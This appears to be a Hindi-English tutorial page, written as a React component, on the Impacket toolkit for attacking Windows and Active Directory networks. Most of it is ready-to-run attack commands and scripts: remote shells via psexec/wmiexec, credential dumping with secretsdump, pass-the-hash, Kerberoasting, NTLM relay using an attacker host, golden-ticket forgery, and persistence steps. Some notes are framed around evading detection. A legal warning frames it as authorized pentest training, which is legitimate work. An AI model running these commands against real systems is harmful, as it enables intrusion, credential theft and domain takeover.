import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Impacket() {
  return (
    <TutorialLayout
      title="impacket"
      subtitle="Python network protocols toolkit — Windows/AD penetration testing का राजा"
      icon="🐍"
      prev={{ to: '/tool/yersinia', label: 'yersinia' }}
      next={{ to: '/tool/crackmapexec', label: 'crackmapexec' }}
    >
      <h2>What is Impacket?</h2>
      <p>
        Impacket एक Python library और collection of tools है जो Windows network protocols को implement करता है। SMB, Kerberos, LDAP, MSSQL, WMI, NTLM, DNS, IP, ICMP — लगभग सभी network protocols जो Windows और Active Directory environment में इस्तेमाल होते हैं, Impacket उन्हें low-level पर handle करता है। यह Fortra (पहले SecureAuth/Core Security) ने develop किया है और यह open source (Apache 2.0 license) है।
      </p>
      <p>
        Impacket सिर्फ एक library नहीं है — इसमें 30+ ready-to-use scripts हैं जो penetration testers और red teamers daily use करते हैं। psexec.py, secretsdump.py, wmiexec.py, GetUserSPNs.py, ntlmrelayx.py — ये सभी Impacket के parts हैं। Active Directory penetration testing में Impacket बिना सोचे-समझे use होने वाला standard toolkit है।
      </p>
      <p>
        Impacket की सबसे बड़ी ताकत है इसका Python-based होना। आप scripts लिख सकते हो, automation कर सकते हो, और CI/CD pipelines में integrate कर सकते हो। यह lightweight है — Metasploit जैसा heavy framework नहीं। Kali Linux और Nethunter दोनों में pre-installed आता है।
      </p>
      <p>
        Impacket Windows protocols को Linux/macOS से directly access करने की capability देता है। आपको Windows machine की ज़रूरत नहीं — Kali Linux से ही SMB shares browse कर सकते हो, WMI commands run कर सकते हो, MSSQL queries execute कर सकते हो, और Kerberos tickets generate कर सकते हो। यह cross-platform compatibility Impacket को unique बनाती है।
      </p>
      <p>
        Active Directory environments में Impacket का कोई substitute नहीं है। CrackMapExec network-wide scanning के लिए अच्छा है, BloodHound attack path visualization के लिए, Mimikatz credential extraction के लिए — लेकिन Impacket सब कुछ कर सकता है। Remote execution, credential dumping, Kerberos attacks, relay attacks, MSSQL exploitation — सब एक toolkit में। यही कारण है कि हर penetration tester के toolkit में Impacket ज़रूर होता है।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> Impacket केवल अधिकृत पेनेट्रेशन टेस्टिंग और रेड टीम ऑपरेशंस में ही इस्तेमाल करें। बिना अनुमति के remote access, credential dumping, या Active Directory exploitation अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत network access अपराध है — 3 साल तक की जेल और 5 लाख तक का जुर्माना हो सकता है। केवल लिखित अनुमति के साथ ही उपयोग करें।
      </div>

      <h2>History of Impacket</h2>
      <p>
        Impacket की शुरुआत 2003 में Core Security Technologies ने की थी। उस समय Windows network protocols के लिए कोई proper Python library नहीं थी। Security researchers को manually packets craft करने पड़ते थे। Impacket ने यह काम बहुत आसान कर दिया — Python में ही SMB, Kerberos, NTLM जैसे protocols handle होने लगे।
      </p>
      <p>
        2010 में Impacket को major rewrite मिला और इसमें कई नए tools add हुए — psexec.py, secretsdump.py, wmiexec.py। ये tools जल्दी ही penetration testers के favorites बन गए। 2015 में SecureAuth ने Core Security को acquire किया और Impacket को continue develop किया। 2022 में Fortra ने SecureAuth को acquire किया।
      </p>
      <p>
        आज Impacket GitHub पर 13,000+ stars के साथ सबसे popular Windows protocol library है। इसे actively develop किया जा रहा है और नए features और bug fixes regular आते रहते हैं। OSCP, CRTP, CRTE जैसे certifications में Impacket extensively use होता है।
      </p>

      <h2>How Impacket Works?</h2>
      <p>
        Impacket network protocols को pure Python में implement करता है। यह raw sockets से packets बनाता है, भेजता है, और parse करता है। हर protocol के लिए अलग module है:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">SMB Protocol:</strong> impacket.smbconnection और impacket.smb — file sharing, remote execution, named pipes</li>
        <li><strong className="text-white">Kerberos Protocol:</strong> impacket.krb5 — ticket requests, ticket manipulation, delegation attacks</li>
        <li><strong className="text-white">NTLM Authentication:</strong> impacket.ntlm — hash-based authentication, relay attacks</li>
        <li><strong className="text-white">LDAP Protocol:</strong> impacket.ldap — Active Directory queries, user/computer enumeration</li>
        <li><strong className="text-white">MSSQL Protocol:</strong> impacket.mssql — SQL Server connections, xp_cmdshell execution</li>
        <li><strong className="text-white">WMI Protocol:</strong> impacket.dcerpc.v5.dcom.wmi — Windows Management Instrumentation</li>
        <li><strong className="text-white">DCERPC:</strong> impacket.dcerpc — Distributed Computing Environment RPC</li>
        <li><strong className="text-white">TDS Protocol:</strong> impacket.tds — Tabular Data Stream (MSSQL)</li>
      </ul>
      <p>
        Impacket का architecture layered है। सबसे नीचे raw socket layer है। उसके ऊपर protocol-specific modules (SMB, Kerberos, NTLM) हैं। उसके ऊपर application-level tools (psexec, secretsdump) हैं। हर layer independently काम करती है — आप low-level modules directly use कर सकते हो या high-level tools use कर सकते हो।
      </p>

      <h2>Installation</h2>
      <p>
        Impacket Kali Linux और Nethunter में pre-installed आता है। अगर नहीं है तो कई तरीकों से install कर सकते हो:
      </p>
      <CodeBlock
        title="Impacket Installation"
        code={`# pip से (सबसे आसान):
pip3 install impacket

# GitHub से (latest development version):
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install .

# pip से upgrade:
pip3 install impacket --upgrade

# Version check:
impacket-smbclient --version

# All tools list करें:
# /usr/bin/ या ~/.local/bin/ में impacket-* scripts हैं
ls /usr/bin/impacket-*

# Docker से:
docker pull fortra/impacket
docker run -it fortra/impacket

# Verify installation:
python3 -c "import impacket; print(impacket.__version__)"`}
      />

      <h2>Important Options</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Option</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">कहाँ इस्तेमाल</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-hashes</td><td className="py-2 px-3">NTLM hash से authenticate करें (Pass-the-Hash)</td><td className="py-2 px-3">सभी tools</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-k</td><td className="py-2 px-3">Kerberos authentication use करें</td><td className="py-2 px-3">सभी tools</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-no-pass</td><td className="py-2 px-3">बिना password के authenticate</td><td className="py-2 px-3">सभी tools</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-dc-ip</td><td className="py-2 px-3">Domain Controller IP specify करें</td><td className="py-2 px-3">Kerberos tools</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-target-ip</td><td className="py-2 px-3">Target machine IP</td><td className="py-2 px-3">Relay attacks</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-port</td><td className="py-2 px-3">Custom port specify करें</td><td className="py-2 px-3">सभी tools</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-debug</td><td className="py-2 px-3">Debug output show करें</td><td className="py-2 px-3">Troubleshooting</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-outputfile</td><td className="py-2 px-3">Output file में save करें</td><td className="py-2 px-3">secretsdump</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-request</td><td className="py-2 px-3">TGS ticket request करें</td><td className="py-2 px-3">GetUserSPNs</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-usersfile</td><td className="py-2 px-3">Username list file</td><td className="py-2 px-3">GetNPUsers</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-format</td><td className="py-2 px-3">Output format (hashcat, john)</td><td className="py-2 px-3">Kerberoast/AS-REP</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-smb2support</td><td className="py-2 px-3">SMBv2 support enable करें</td><td className="py-2 px-3">ntlmrelayx</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-socks</td><td className="py-2 px-3">SOCKS proxy create करें</td><td className="py-2 px-3">ntlmrelayx</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-tf</td><td className="py-2 px-3">Target file (multiple IPs)</td><td className="py-2 px-3">ntlmrelayx</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">-codec</td><td className="py-2 px-3">Output encoding specify करें</td><td className="py-2 px-3">Non-English output</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Basic Usage</h2>
      <p>
        Impacket tools command-line से directly run होते हैं। हर tool का अपना syntax है लेकिन authentication pattern common है: domain/user:password@target
      </p>
      <CodeBlock
        title="Basic Commands"
        code={`# Authentication pattern:
# tool.py domain/user:password@target

# Simple SMB connection:
impacket-smbclient domain/user:password@target_ip

# SMB shares list:
impacket-smbclient domain/user:password@target_ip -list

# Remote command (psexec):
impacket-psexec domain/user:password@target_ip

# Remote command (wmiexec):
impacket-wmiexec domain/user:password@target_ip whoami

# Credential dump:
impacket-secretsdump domain/user:password@target_ip

# Kerberoasting:
impacket-GetUserSPNs domain/user:password -dc-ip DC_IP -request

# AS-REP Roasting:
impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip DC_IP

# NTLM Relay:
impacket-ntlmrelayx -tf targets.txt -smb2support

# MSSQL client:
impacket-mssqlclient domain/user:password@target_ip -windows-auth`}
      />

      <h2>psexec.py — Remote Command Execution</h2>
      <p>
        psexec.py Impacket का सबसे popular tool है। यह Windows के PsExec utility जैसा काम करता है — SMB protocol के ज़रिए remote system पर commands execute करता है। यह service install करता है, command run करता है, output return करता है, और service uninstall कर देता है। Administrator access चाहिए।
      </p>
      <CodeBlock
        title="psexec.py Detailed"
        code={`# Basic remote shell:
psexec.py domain/user:password@target_ip

# Single command execute:
psexec.py domain/user:password@target_ip whoami

# Pass-the-Hash:
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:HASH user@target_ip

# Domain admin hash se full access:
psexec.py -hashes :NTHASH domain/Administrator@dc_ip

# Custom port:
psexec.py user:password@target_ip -port 445

# Kerberos authentication:
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py -k -no-pass domain/user@target

# Service name change (detection avoid):
psexec.py user:password@target_ip -service-name MyService

# Binary upload करके execute:
psexec.py user:password@target_ip -file upload.exe

# How psexec works internally:
# 1. SMB connection establish
# 2. Service Control Manager (SCM) open
# 3. Service create (PSEXESVC)
# 4. Binary upload (PSEXESVC.EXE)
# 5. Service start
# 6. Command execute via named pipe
# 7. Output return
# 8. Service stop और delete`}
      />

      <h2>wmiexec.py — WMI Remote Execution</h2>
      <p>
        wmiexec.py WMI (Windows Management Instrumentation) protocol use करके remote commands execute करता है। psexec की तुलना में stealthier है क्योंकि यह service install नहीं करता — सिर्फ WMI calls use करता है। Semi-interactive shell provide करता है।
      </p>
      <CodeBlock
        title="wmiexec.py Detailed"
        code={`# Semi-interactive shell:
wmiexec.py domain/user:password@target_ip

# Single command:
wmiexec.py domain/user:password@target_ip whoami

# Pass-the-Hash:
wmiexec.py -hashes :NTHASH user@target_ip

# Directory listing:
wmiexec.py user:password@target_ip "dir C:\\Users"

# File download:
wmiexec.py user:password@target_ip "type C:\\secret.txt"

# Registry query:
wmiexec.py user:password@target_ip "reg query HKLM\\SOFTWARE"

# Network info:
wmiexec.py user:password@target_ip "ipconfig /all"

# Process list:
wmiexec.py user:password@target_ip "tasklist"

# User list:
wmiexec.py user:password@target_ip "net user"

# Firewall status:
wmiexec.py user:password@target_ip "netsh firewall show config"

# WMI advantages:
# - No service install (stealthier)
# - No binary upload
# - Works through firewalls
# - Less detection by EDR`}
      />

      <h2>smbexec.py — SMB Service Execution</h2>
      <p>
        smbexec.py SMB service के ज़रिए commands execute करता है। यह psexec जैसा है लेकिन अलग technique use करता है — batch files create करके execute करता है। यह भी administrator access चाहिए।
      </p>
      <CodeBlock
        title="smbexec.py Detailed"
        code={`# Interactive shell:
smbexec.py domain/user:password@target_ip

# Single command:
smbexec.py domain/user:password@target_ip whoami

# Pass-the-Hash:
smbexec.py -hashes :NTHASH user@target_ip

# Custom share:
smbexec.py user:password@target_ip -share C$

# SMB port change:
smbexec.py user:password@target_ip -port 445

# Command examples:
smbexec.py user:password@target_ip "systeminfo"
smbexec.py user:password@target_ip "net user /domain"
smbexec.py user:password@target_ip "net group \"Domain Admins\" /domain"
smbexec.py user:password@target_ip "wmic qfe list brief"

# How smbexec works:
# 1. SMB connection
# 2. Share access (ADMIN$ or C$)
# 3. Batch file create with commands
# 4. Service create pointing to batch file
# 5. Service start
# 6. Output captured via temp file
# 7. Service delete और cleanup`}
      />

      <h2>atexec.py — Task Scheduler Execution</h2>
      <p>
        atexec.py Windows Task Scheduler use करके remote commands execute करता है। यह scheduled task create करता है, command run करता है, output capture करता है, और task delete कर देता है।
      </p>
      <CodeBlock
        title="atexec.py Detailed"
        code={`# Task scheduler execution:
atexec.py domain/user:password@target_ip whoami

# Pass-the-Hash:
atexec.py -hashes :NTHASH user@target_ip "ipconfig"

# System info:
atexec.py user:password@target_ip "systeminfo"

# User enumeration:
atexec.py user:password@target_ip "net user /domain"

# Share listing:
atexec.py user:password@target_ip "net share"

# Process listing:
atexec.py user:password@target_ip "tasklist /v"

# Registry dump:
atexec.py user:password@target_ip "reg save HKLM\\SAM C:\\SAM"

# How atexec works:
# 1. RPC connection (port 135)
# 2. Task Scheduler service access
# 3. Task create with command
# 4. Task execute
# 5. Output read from temp file
# 6. Task delete
# 7. Cleanup`}
      />

      <h2>dcomexec.py — DCOM Execution</h2>
      <p>
        dcomexec.py DCOM (Distributed Component Object Model) use करके remote commands execute करता है। MMC20.Application, ShellWindows, ShellBrowserWindow — अलग-अलग DCOM objects try करता है।
      </p>
      <CodeBlock
        title="dcomexec.py Detailed"
        code={`# DCOM execution (MMC20.Application):
dcomexec.py domain/user:password@target_ip whoami

# ShellWindows object:
dcomexec.py domain/user:password@target_ip -object ShellWindows whoami

# ShellBrowserWindow:
dcomexec.py domain/user:password@target_ip -object ShellBrowserWindow whoami

# Pass-the-Hash:
dcomexec.py -hashes :NTHASH user@target_ip "ipconfig"

# DCOM objects available:
# - MMC20.Application (default)
# - ShellWindows
# - ShellBrowserWindow
# - ExcelDDE (if Excel installed)

# DCOM advantages:
# - Different execution method
# - Bypass some firewall rules
# - Port 135 + dynamic ports`}
      />

      <h2>secretsdump.py — Credential Dumping</h2>
      <p>
        secretsdump.py Impacket का सबसे powerful credential extraction tool है। यह SAM database, NTDS.dit, LSA secrets, cached credentials, DPAPI secrets — सब dump कर सकता है। Remote system से भी और local SAM/SYSTEM files से भी।
      </p>
      <CodeBlock
        title="secretsdump.py Detailed"
        code={`# Remote dump (सभी credentials):
secretsdump.py domain/user:password@target_ip

# SAM database only:
secretsdump.py user:password@target_ip -sam

# SYSTEM hive only:
secretsdump.py user:password@target_ip -system

# NTDS.dit (Domain Controller):
secretsdump.py domain/Administrator:password@dc_ip -ntds

# LSA secrets:
secretsdump.py user:password@target_ip -ls

# Cached credentials:
secretsdump.py user:password@target_ip -cached

# Output file में save:
secretsdump.py user:password@target_ip -outputfile dump

# Pass-the-Hash:
secretsdump.py -hashes :NTHASH user@target_ip

# Kerberos authentication:
secretsdump.py -k -no-pass domain/user@target

# Local SAM dump (offline):
secretsdump.py -sam SAM.save -system SYSTEM.save -security SECURITY.save

# Output format:
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:HASH:::
# username:RID:LMHASH:NTHASH:::

# Hash crack करो:
# hashcat -m 1000 hashes.txt rockyou.txt  (NTLM)
# john --format=nt hashes.txt`}
      />

      <h2>GetUserSPNs.py — Kerberoasting</h2>
      <p>
        Kerberoasting Active Directory का सबसे common attack है। Service accounts के SPN (Service Principal Names) के लिए TGS tickets request करके offline crack करना। GetUserSPNs.py यह automate करता है।
      </p>
      <CodeBlock
        title="GetUserSPNs.py Detailed"
        code={`# Kerberoasting — TGS tickets nikalo:
GetUserSPNs.py domain/user:password -dc-ip DC_IP -request

# Output file में save:
GetUserSPNs.py domain/user:password -dc-ip DC_IP -request -outputfile kerberoast.txt

# Hashcat format:
GetUserSPNs.py domain/user:password -dc-ip DC_IP -request -format hashcat

# John format:
GetUserSPNs.py domain/user:password -dc-ip DC_IP -request -format john

# Specific user:
GetUserSPNs.py domain/user:password -dc-ip DC_IP -request-user svc_sql

# Pass-the-Hash:
GetUserSPNs.py -hashes :NTHASH domain/user -dc-ip DC_IP -request

# Users list only (no tickets):
GetUserSPNs.py domain/user:password -dc-ip DC_IP -usersfile users.txt

# Crack करो:
# hashcat -m 13100 kerberoast.txt rockyou.txt  (TGS-REP)
# john --format=krb5tgs kerberoast.txt

# Kerberoasting kaise kaam karta hai:
# 1. LDAP query से SPN wale service accounts find
# 2. Har account ke लिए TGS ticket request
# 3. Ticket hash extract
# 4. Offline crack (hashcat/john)
# 5. Service account password mil jaata hai`}
      />

      <h2>GetNPUsers.py — AS-REP Roasting</h2>
      <p>
        AS-REP Roasting उन users पर काम करता है जिनका "Do not require Kerberos preauthentication" enabled है। इन users के AS-REP response में encrypted data होता है जिसे offline crack किया जा सकता है।
      </p>
      <CodeBlock
        title="GetNPUsers.py Detailed"
        code={`# AS-REP Roasting (domain users check):
GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC_IP -format hashcat

# Specific user:
GetNPUsers.py domain/user -dc-ip DC_IP -format hashcat

# Hash file output:
GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC_IP -outputfile asrep.txt

# Valid credentials se enumerate:
GetNPUsers.py domain/user:password -dc-ip DC_IP -request

# John format:
GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC_IP -format john

# Crack:
# hashcat -m 18200 asrep.txt rockyou.txt  (AS-REP)
# john --format=krb5asrep asrep.txt

# AS-REP Roasting ka requirement:
# - User account par "Do not require Kerberos preauthentication" enabled
# - Ye setting default OFF hoti hai
# - Admin ne manually enable ki hogi
# - BloodHound se find kar sakte ho: MATCH (u:User {dontreqpreauth: true})`}
      />

      <h2>ntlmrelayx.py — NTLM Relay Attacks</h2>
      <p>
        ntlmrelayx.py NTLM authentication capture करके दूसरे target पर relay करता है। यह Man-in-the-Middle attack है जो NTLM authentication protocol की weakness exploit करता है। SMB, HTTP, LDAP, MSSQL — किसी भी protocol पर relay कर सकता है।
      </p>
      <CodeBlock
        title="ntlmrelayx.py Detailed"
        code={`# SMB relay (basic):
ntlmrelayx.py -tf targets.txt -smb2support

# Specific target:
ntlmrelayx.py -t target_ip -smb2support

# LDAP relay (AD modification):
ntlmrelayx.py -t ldap://dc_ip -smb2support

# HTTP to SMB relay:
ntlmrelayx.py -t target_ip -smb2support -l /tmp/output

# SOCKS proxy (persistent access):
ntlmrelayx.py -t target_ip -smb2support -socks

# Command execution on relay:
ntlmrelayx.py -t target_ip -smb2support -c "whoami"

# Credential dumping via relay:
ntlmrelayx.py -t target_ip -smb2support --dump

# Machine account add (Privilege Escalation):
ntlmrelayx.py -t ldap://dc_ip -smb2support --add-computer

# Delegate access:
ntlmrelayx.py -t ldap://dc_ip -smb2support --delegate-access

# IPv6 relay (mitm6 + ntlmrelayx):
ntlmrelayx.py -t ldaps://dc_ip -smb2support -6 -wh attacker.local

# Relay attack setup (Responder + ntlmrelayx):
# Terminal 1: ntlmrelayx.py -tf targets.txt -smb2support
# Terminal 2: responder -I eth0 -wF
# Jab koi victim authenticate karega → relay hoga`}
      />

      <h2>smbclient.py — SMB File Access</h2>
      <p>
        smbclient.py SMB shares access करने और files browse करने के लिए है। Windows shares (C$, ADMIN$, IPC$) को Linux से directly access कर सकते हो।
      </p>
      <CodeBlock
        title="smbclient.py Detailed"
        code={`# SMB shares list:
smbclient.py user:password@target_ip -list

# Specific share access:
smbclient.py user:password@target_ip -share C$

# Directory listing:
smbclient.py user:password@target_ip -share C$ -dir

# File download:
smbclient.py user:password@target_ip -share C$ -get secret.txt

# File upload:
smbclient.py user:password@target_ip -share C$ -put malware.exe

# Command execute:
smbclient.py user:password@target_ip -c "dir C:\\Users"

# Pass-the-Hash:
smbclient.py -hashes :NTHASH user@target_ip

# IPC$ (null session):
smbclient.py ''@target_ip -no-pass -list

# Kerberos:
smbclient.py -k -no-pass domain/user@target

# SMB shares types:
# C$ — Admin share (full C: drive)
# ADMIN$ — Windows directory
# IPC$ — Inter-Process Communication
# print$ — Printer drivers
# Custom shares — जो admin ने create किए`}
      />

      <h2>mssqlclient.py — MSSQL Database</h2>
      <p>
        mssqlclient.py Microsoft SQL Server से connect करने और queries run करने के लिए है। xp_cmdshell enable करके OS commands भी execute कर सकते हो।
      </p>
      <CodeBlock
        title="mssqlclient.py Detailed"
        code={`# MSSQL connection:
mssqlclient.py sa:password@target_ip

# Windows authentication:
mssqlclient.py domain/user:password@target_ip -windows-auth

# Pass-the-Hash:
mssqlclient.py -hashes :NTHASH user@target_ip

# SQL queries:
SQL> select @@version
SQL> select name from master..sysdatabases
SQL> select name from master..sysobjects where xtype='U'

# xp_cmdshell enable:
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> xp_cmdshell ipconfig /all
SQL> xp_cmdshell net user

# Linked servers:
SQL> enum_links
SQL> exec_linked -link LINKED_SERVER -command "whoami"

# File operations:
SQL> xp_cmdshell "type C:\\secret.txt"
SQL> xp_cmdshell "echo test > C:\\output.txt"`}
      />

      <h2>Additional Tools</h2>
      <CodeBlock
        title="Other Impacket Tools"
        code={`# ticketer.py — Golden/Silver Ticket:
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain target.local Administrator

# getTGT.py — TGT ticket obtain:
getTGT.py domain/user:password -dc-ip DC_IP

# getST.py — Service ticket obtain:
getST.py -spn cifs/target.domain.local domain/user:password -dc-ip DC_IP

# lookupsid.py — SID enumeration:
lookupsid.py domain/user:password@target_ip

# samrdump.py — SAM enumeration:
samrdump.py domain/user:password@target_ip

# findDelegation.py — Delegation find:
findDelegation.py domain/user:password -dc-ip DC_IP

# addcomputer.py — Computer account add:
addcomputer.py domain/user:password -computer-name FAKE$ -computer-pass Password123 -dc-ip DC_IP

# rbcd.py — Resource-Based Constrained Delegation:
rbcd.py -delegate-from FAKE$ -delegate-to TARGET$ -action write domain/user:password -dc-ip DC_IP

# raiseChild.py — Child to Parent domain escalation:
raiseChild.py domain/user:password -target-ip DC_IP

# smbserver.py — SMB server (file sharing):
smbserver.py share /tmp/shared -smb2support

# rdp_check.py — RDP authentication check:
rdp_check.py domain/user:password@target_ip`}
      />

      <h2>Pass-the-Hash Technique</h2>
      <p>
        Pass-the-Hash (PTH) एक technique है जिसमें NTLM hash directly use करके authenticate किया जाता है — password crack करने की ज़रूरत नहीं। Impacket के सभी tools PTH support करते हैं।
      </p>
      <CodeBlock
        title="Pass-the-Hash Examples"
        code={`# Hash format:
# aad3b435b51404eeaad3b435b51404ee:ACTUAL_NTHASH
# ya :ACTUAL_NTHASH (LM hash empty)

# psexec with PTH:
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:HASH domain/Administrator@target

# wmiexec with PTH:
wmiexec.py -hashes :HASH domain/Administrator@target

# secretsdump with PTH:
secretsdump.py -hashes :HASH domain/Administrator@target

# smbclient with PTH:
smbclient.py -hashes :HASH domain/Administrator@target

# mssqlclient with PTH:
mssqlclient.py -hashes :HASH sa@target

# PTH workflow:
# 1. secretsdump se hashes dump करो
# 2. Administrator hash extract करो
# 3. Pass-the-Hash से psexec/wmiexec
# 4. Full system access

# Important notes:
# - LM hash empty ho sakta hai (aad3b435b51404eeaad3b435b51404ee)
# - NT hash use hota hai authentication ke liye
# - Password crack ki zaroorat nahi
# - Admin access chahiye target par`}
      />

      <h2>Kerberos Attacks Workflow</h2>
      <CodeBlock
        title="Kerberos Attack Chain"
        code={`# Step 1: TGT obtain करो
export KRB5CCNAME=/tmp/admin.ccache
getTGT.py domain/Administrator:password -dc-ip DC_IP

# Step 2: Kerberoasting — service accounts crack
GetUserSPNs.py domain/user:password -dc-ip DC_IP -request
# hashcat -m 13100 hashes.txt rockyou.txt

# Step 3: AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC_IP -format hashcat
# hashcat -m 18200 hashes.txt rockyou.txt

# Step 4: Silver Ticket (service account hash)
ticketer.py -nthash SVC_HASH -domain-sid S-1-5-21-xxx -domain target.local -spn cifs/target Administrator

# Step 5: Golden Ticket (KRBTGT hash — Domain Controller se)
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain target.local Administrator

# Step 6: S4U2Self (Constrained Delegation)
getST.py -spn cifs/target.domain.local -impersonate Administrator domain/svc_account:password -dc-ip DC_IP

# Step 7: Unconstrained Delegation abuse
# Machine account add करो
addcomputer.py domain/user:password -computer-name FAKE$ -computer-pass Pass123
# RBCD set करो
rbcd.py -delegate-from FAKE$ -delegate-to TARGET$ -action write domain/user:password
# Ticket obtain
getST.py -spn cifs/TARGET.domain.local -impersonate Administrator domain/'FAKE$':Pass123`}
      />

      <h2>Scripting and Automation</h2>
      <p>
        Impacket Python library होने के कारण scripting बहुत आसान है। आप custom scripts लिख सकते हो जो multiple targets पर automatically attacks करें।
      </p>
      <CodeBlock
        title="Automated Credential Dump Script"
        code={`#!/usr/bin/env python3
# auto_dump.py — Multiple targets se credentials dump

import subprocess
import sys

targets = [
    {"ip": "192.168.1.10", "user": "admin", "pass": "password123"},
    {"ip": "192.168.1.11", "user": "admin", "pass": "password123"},
    {"ip": "192.168.1.12", "user": "admin", "pass": "password123"},
]

for target in targets:
    print(f"[+] Dumping: {target['ip']}")
    cmd = f"secretsdump.py {target['user']}:{target['pass']}@{target['ip']}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)

    if result.returncode == 0:
        with open(f"{target['ip']}_dump.txt", "w") as f:
            f.write(result.stdout)
        print(f"[+] Saved: {target['ip']}_dump.txt")
    else:
        print(f"[-] Failed: {target['ip']}")
        print(f"    Error: {result.stderr}")`}
      />

      <CodeBlock
        title="Kerberoasting Automation"
        code={`#!/usr/bin/env python3
# auto_kerberoast.py — Automated Kerberoasting + Crack

import subprocess

domain = "target.local"
dc_ip = "192.168.1.1"
user = "pentester"
password = "Password123"

# Step 1: Kerberoast
print("[+] Kerberoasting...")
cmd = f"GetUserSPNs.py {domain}/{user}:{password} -dc-ip {dc_ip} -request -outputfile kerberoast.txt"
subprocess.run(cmd, shell=True)

# Step 2: Crack with hashcat
print("[+] Cracking with hashcat...")
cmd = "hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force"
subprocess.run(cmd, shell=True)

# Step 3: Show cracked
print("[+] Cracked passwords:")
cmd = "hashcat -m 13100 kerberoast.txt --show"
subprocess.run(cmd, shell=True)`}
      />

      <CodeBlock
        title="Multi-Protocol Scanner"
        code={`#!/usr/bin/env python3
# multi_scan.py — Multiple protocols check करो

import subprocess

target = "192.168.1.10"
domain = "target.local"
user = "admin"
password = "password123"

tools = [
    f"smbclient.py {domain}/{user}:{password}@{target} -list",
    f"wmiexec.py {domain}/{user}:{password}@{target} whoami",
    f"mssqlclient.py {domain}/{user}:{password}@{target} -windows-auth",
    f"lookupsid.py {domain}/{user}:{password}@{target}",
    f"samrdump.py {domain}/{user}:{password}@{target}",
]

for tool in tools:
    print(f"[+] Running: {tool.split()[0]}")
    result = subprocess.run(tool, shell=True, capture_output=True, text=True)
    print(result.stdout[:500])
    print("-" * 50)`}
      />

      <h2>Pentesting Workflow</h2>
      <CodeBlock
        title="Standard AD Pentest Flow"
        code={`# Phase 1: Enumeration
# SMB shares:
smbclient.py user:password@target -list
# SID enumeration:
lookupsid.py user:password@target
# Users:
samrdump.py user:password@target
# Delegation:
findDelegation.py domain/user:password -dc-ip DC_IP

# Phase 2: Initial Access
# Credential dump:
secretsdump.py user:password@target
# Hash crack:
hashcat -m 1000 hashes.txt rockyou.txt
# Pass-the-Hash:
psexec.py -hashes :HASH admin@target

# Phase 3: Privilege Escalation
# Kerberoasting:
GetUserSPNs.py domain/user:password -dc-ip DC_IP -request
# AS-REP Roasting:
GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC_IP
# Delegation abuse:
findDelegation.py domain/user:password -dc-ip DC_IP

# Phase 4: Domain Compromise
# Golden Ticket:
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx domain/Administrator
# DCSync (secretsdump from DC):
secretsdump.py -hashes :HASH domain/Administrator@dc_ip -ntds
# Full dump:
secretsdump.py -hashes :HASH domain/Administrator@dc_ip

# Phase 5: Persistence
# Golden Ticket (survives password change):
export KRB5CCNAME=/tmp/admin.ccache
psexec.py -k -no-pass domain/Administrator@target
# Machine account add:
addcomputer.py domain/user:password -computer-name PERSIST$ -computer-pass Pass123`}
      />

      <h2>Impacket vs Other Tools</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Feature</th>
              <th className="text-left py-2 px-3 text-neon-green">Impacket</th>
              <th className="text-left py-2 px-3 text-neon-green">CrackMapExec</th>
              <th className="text-left py-2 px-3 text-neon-green">Evil-WinRM</th>
              <th className="text-left py-2 px-3 text-neon-green">Metasploit</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Language</td><td className="py-2 px-3">Python</td><td className="py-2 px-3">Python</td><td className="py-2 px-3">Ruby</td><td className="py-2 px-3">Ruby</td></tr>
